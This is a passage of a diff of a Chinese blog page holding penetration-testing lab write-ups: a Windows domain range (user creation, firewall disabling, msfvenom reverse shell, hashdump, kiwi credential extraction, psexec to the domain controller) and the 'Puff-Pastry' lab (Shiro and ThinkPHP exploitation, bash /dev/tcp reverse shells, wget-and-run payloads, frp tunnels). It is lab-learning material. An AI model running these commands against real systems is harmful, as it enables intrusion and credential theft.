+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_20.png" alt="" /></figure>
+
+
+</p>
 <p>整理一下收集到的win域信息</p>
 <p>该域名为god.org，域控为OWA，域管理员为Administrator，内网网段为192.168.52.1/24，我们用ping命令探测域控的ip</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_21.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_21.png" alt="" /></figure>
+
+
+</p>
 <p>域控的ip为192.168.52.138</p>
 <h3 id="尝试rdp">尝试rdp</h3>
 <p>接下来在win7机器上增加用户，看能不能rdp上去</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>net user l1uyun aBc12@liuyun
 </span></span><span style="display:flex;"><span>net localgroup administrators l1uyun /add
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_22.png" alt=""  /></p>
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_22.png" alt="" /></figure>
+
+
+</p>
 <p>查看3389端口是否开启,没有启动的话就手动启动一下</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>关闭防火墙
 </span></span><span style="display:flex;"><span>netsh advfirewall set allprofiles state off
@@ -1180,9 +1615,19 @@ find参数中传进去的%00也就是空字符,将拼接之后的/给截断了</
 </span></span><span style="display:flex;"><span>netstat -ano | find <span style="color:#e6db74">&#34;3389&#34;</span>
 </span></span><span style="display:flex;"><span>没有开启的话手动开启3389端口
 </span></span><span style="display:flex;"><span>REG ADD HKLM<span style="color:#ae81ff">\S</span>YSTEM<span style="color:#ae81ff">\C</span>urrentControlSet<span style="color:#ae81ff">\C</span>ontrol<span style="color:#ae81ff">\T</span>erminal<span style="color:#e6db74">&#34; &#34;</span>Server /v fDenyTSConnections /t REG_DWORD /d <span style="color:#ae81ff">00000000</span> /f 
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_23.png" alt=""  /></p>
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_23.png" alt="" /></figure>
+
+
+</p>
 <p>成功rdp上去了</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_24.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_24.png" alt="" /></figure>
+
+
+</p>
 <h3 id="msf上线">msf上线</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.71.101 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">10010</span> -f exe -o shell.exe
 </span></span><span style="display:flex;"><span>
@@ -1193,15 +1638,35 @@ find参数中传进去的%00也就是空字符,将拼接之后的/给截断了</
 </span></span><span style="display:flex;"><span>set lport <span style="color:#ae81ff">10010</span>              
 </span></span><span style="display:flex;"><span>exploit
 </span></span></code></pre></div><p>这里最开始wsl是镜像网络, 后面改成桥接之后才成功反弹回去
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_25.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_25.png" alt="" /></figure>
+
+
+</p>
 <h3 id="getsystem提权">getsystem提权</h3>
 <p>提权,使用meterpreter里面的getsystem一键提权
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_26.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_26.png" alt="" /></figure>
+
+
+</p>
 <h3 id="迁移进程">迁移进程</h3>
 <p>使用ps查看进程信息,msf的进程pid为5060,apache的为2860,进行进程迁移</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_27.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_27.png" alt="" /></figure>
+
+
+</p>
 <p>迁移,然后清除痕迹</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_28.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_28.png" alt="" /></figure>
+
+
+</p>
 <h3 id="收集凭据">收集凭据</h3>
 <p>获取hash</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; hashdump
@@ -1211,23 +1676,53 @@ find参数中传进去的%00也就是空字符,将拼接之后的/给截断了</
 </span></span><span style="display:flex;"><span>liukaifeng01:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 </span></span></code></pre></div><p>这里需要进一步使用Mimikatz来提取凭证、密码和其他敏感信息。</p>
 <p>在msf中是使用kiwi来进行平替</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_29.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_29.png" alt="" /></figure>
+
+
+</p>
 <p>kiwi模块同时支持32位和64位的系统，但是该模块默认是加载32位的系统，所以如果目标主机是64位系统的话，直接默认加载该模块会导致很多功能无法使用。
 所以如果目标系统是64位的，则必须先查看系统进程列表，然后将meterpreter进程迁移到一个64位程序的进程中，才能加载kiwi并且查看系统明文。如果目标系统是32位的，则没有这个限制</p>
 <p>因为还需要system的权限,所以只能迁移到system用户的进程中</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_30.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_30.png" alt="" /></figure>
+
+
+</p>
 <p>获取到明文凭证
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_31.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_31.png" alt="" /></figure>
+
+
+</p>
 <h3 id="搭建socks隧道">搭建socks隧道</h3>
 <p>第一次使用msf来搭socks,之前都是在用frp</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>run post/multi/manage/autoroute        <span style="color:#75715e">#加载MSF的autoroute模块，获取当前机器的所有网段信息</span>
 </span></span></code></pre></div><p>这里为啥要使用autoroute这个模块呢</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_32.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_32.png" alt="" /></figure>
+
+
+</p>
 <p>使用auxiliary/server/socks_proxy模块来实现socks</p>
 <p>先background把现在的meterpreter会话挂起,然后加载这个模块</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_33.png" alt=""  />
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_33.png" alt="" /></figure>
+
+
+
 查看jobs可以看到后台运行的socks进程</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_34.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_34.png" alt="" /></figure>
+
+
+</p>
 <h3 id="主机探测">主机探测</h3>
 <p>使用arp-scanner模块进行内网的扫描</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>use post/windows/gather/arp_scanner
@@ -1305,50 +1800,140 @@ find参数中传进去的%00也就是空字符,将拼接之后的/给截断了</
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.52.138:445    - Scanned <span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> hosts 
 </span></span></code></pre></div><p>但是尝试了msf的exploit/windows/smb/ms17_010_eternalblue和 exploit/windows/smb/ms17_010_psexec都失败了</p>
 <p>最后这个执行命令的可以用</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_35.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_35.png" alt="" /></figure>
+
+
+</p>
 <p>那就添加一个用户,然后rdp上去算了
 先添加一个用户</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_36.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_36.png" alt="" /></figure>
+
+
+</p>
 <p>查看添加的用户,添加成功</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_37.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_37.png" alt="" /></figure>
+
+
+</p>
 <p>给管理员权限</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>set COMMAND net localgroup administrators hack /add
 </span></span><span style="display:flex;"><span>set COMMAND net localgroup administrators
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_38.png" alt=""  /></p>
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_38.png" alt="" /></figure>
+
+
+</p>
 <p>3389是关闭的,尝试开启3389</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_39.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_39.png" alt="" /></figure>
+
+
+</p>
 <p>这边是显示已经开启了的,但是还是连不上去</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_40.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_40.png" alt="" /></figure>
+
+
+</p>
 <p>原来是防火墙没关</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>set COMMAND  <span style="color:#e6db74">&#39;netsh advfirewall set allprofiles state off&#39;</span>
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_41.png" alt=""  /></p>
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_41.png" alt="" /></figure>
+
+
+</p>
 <p>这里为啥凭据会是错误的&hellip;.我在虚拟机界面是可以使用这个凭据登进去的&hellip;</p>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_42.png" alt=""  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_42.png" alt="" /></figure>
+
+
+</p>
 <h3 id="cs上线">cs上线</h3>
 <p>看了不少wp都是用cs拿的域控
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_43.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_43.png" alt="" /></figure>
+
+
+
 另一边连接cs_server
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_44.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_44.png" alt="" /></figure>
+
+
+
 启动监听器
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_45.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_45.png" alt="" /></figure>
+
+
+
 生成payload
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_46.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_46.png" alt="" /></figure>
+
+
+
 然后在蚁剑上上传进去,并执行,这边很快的显示弹回来了
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_47.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_47.png" alt="" /></figure>
+
+
+
 之后再beacon进行交互</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sleep <span style="color:#ae81ff">0</span>  <span style="color:#75715e"># 进入交互模式</span>
 </span></span><span style="display:flex;"><span>getsystem <span style="color:#75715e"># 提权</span>
 </span></span><span style="display:flex;"><span>net view <span style="color:#75715e"># 查看当前网络中的其他机器</span>
 </span></span></code></pre></div><p>查看完之后再target视图中可以看到其他机器了,如果没有的话就扫描一下
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_48.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_48.png" alt="" /></figure>
+
+
+
 然后右键,选择psexec64
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_49.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_49.png" alt="" /></figure>
+
+
+
 新建一个用于psexec的监听器,然后
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_50.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_50.png" alt="" /></figure>
+
+
+
 运行之后就能拿到shell了,换成cs之后,很容易的就拿到了域控的shell
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_51.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_51.png" alt="" /></figure>
+
+
+</p>
 <p>最后以同样的方法,使用psexec32上线win2003机器
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_52.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_52.png" alt="" /></figure>
+
+
+</p>
 <h1 id="l1uyun">l1uyun</h1>
 <p>第一次打win域的机器,过段时间再打一下这台机器,这次是在学习打win域的流程了</p>
 <p>这机器拖了好久才弄完&hellip;</p>
@@ -1392,19 +1977,39 @@ find参数中传进去的%00也就是空字符,将拼接之后的/给截断了</
 <h1 id="puff-pastry打靶记录">Puff-Pastry打靶记录</h1>
 <h2 id="搭建">搭建</h2>
 <p>使用docker搭建,然后本地能够访问到一个8080端口
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_1.png" alt="|207"  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_1.png" alt="|207" /><figcaption>|207</figcaption></figure>
+
+
+
 这里我最开始是使用的Windows docker,后面改成了使用虚拟机</p>
 <h2 id="shiro">shiro</h2>
 <h3 id="探测">探测</h3>
 <p>java后端
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_2.png" alt="|522"  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_2.png" alt="|522" /><figcaption>|522</figcaption></figure>
+
+
+
 进去只有一个登录框,在搭建过程中已经知道了第一台机器是shiro,选择记住密码,登录</p>
 <p>这里出现了shiro的特征 Cookie中存在rememberme字段
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_3.png" alt="|453"  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_3.png" alt="|453" /><figcaption>|453</figcaption></figure>
+
+
+</p>
 <h3 id="shiro利用">shiro利用</h3>
 <p>直接上利用工具</p>
 <p>获取flag
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_4.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_4.png" alt="" /></figure>
+
+
+</p>
 <p>拿一个反弹shell</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;bash -i 5&lt;&gt;/dev/tcp/192.168.122.102/1234 0&gt;&amp;5 1&gt;&amp;5&#39;</span> | base64
 </span></span><span style="display:flex;"><span>
@@ -1470,7 +2075,12 @@ find参数中传进去的%00也就是空字符,将拼接之后的/给截断了</
 </span></span><span style="display:flex;"><span>192.168.100.2 shiro
 </span></span><span style="display:flex;"><span>192.168.100.3 thinkphp
 </span></span></code></pre></div><p>现在的网络环境为
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_5.png" alt="|600"  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_5.png" alt="|600" /><figcaption>|600</figcaption></figure>
+
+
+</p>
 <p>接下来需要配置端口转发了,这个我没啥经验,用我wsl里面装过的frp吧</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wsl kali
 </span></span><span style="display:flex;"><span>
@@ -1501,20 +2111,40 @@ find参数中传进去的%00也就是空字符,将拼接之后的/给截断了</
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">localIP</span> = <span style="color:#e6db74">&#34;192.168.110.3&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">localPort</span> = <span style="color:#ae81ff">80</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">remotePort</span> = <span style="color:#ae81ff">9999</span>
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_6.png" alt=""  /></p>
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_6.png" alt="" /></figure>
+
+
+</p>
 <h2 id="thinkphp">thinkphp</h2>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_7.png" alt="|486"  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_7.png" alt="|486" /><figcaption>|486</figcaption></figure>
+
+
+</p>
 <p>网站主页提示了是thinkphp5,直接找到相关工具开始利用</p>
 <h3 id="利用">利用</h3>
 <p>检测漏洞
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_8.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_8.png" alt="" /></figure>
+
+
+
 拿shell</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;YmFzaCAtaSA1PD4vZGV2L3RjcC8xOTIuMTY4LjEyMi4xMDIvNDQ0NCAwPiY1IDE+JjUK&#39;</span> |base64 -d &gt; /tmp/a.sh
 </span></span><span style="display:flex;"><span>chmod <span style="color:#ae81ff">777</span> /tmp/a.sh
 </span></span><span style="display:flex;"><span>ls -al /tmp/a.sh
 </span></span><span style="display:flex;"><span>bash /tmp/a.sh
 </span></span></code></pre></div><p>但是这个shell好像弹不回来..换成php的试试
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_9.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_9.png" alt="" /></figure>
+
+
+
 成功拿到shell</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget 192.168.122.102/ppp -O /tmp/ppp
 </span></span><span style="display:flex;"><span>php /tmp/ppp
@@ -1622,7 +2252,12 @@ find参数中传进去的%00也就是空字符,将拼接之后的/给截断了</
 </span></span><span style="display:flex;"><span>10.85.101.2 redis
 </span></span><span style="display:flex;"><span>10.85.101.1 ???  是运行docker的parrot???
 </span></span></code></pre></div><p>现在的环境为
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_10.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_10.png" alt="" /></figure>
+
+
+
 这里就直接配置个socks代理吧</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-toml" data-lang="toml"><span style="display:flex;"><span><span style="color:#a6e22e">serverAddr</span> = <span style="color:#e6db74">&#34;192.168.122.102&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">serverPort</span> = <span style="color:#ae81ff">7000</span>
@@ -1634,9 +2269,19 @@ find参数中传进去的%00也就是空字符,将拼接之后的/给截断了</
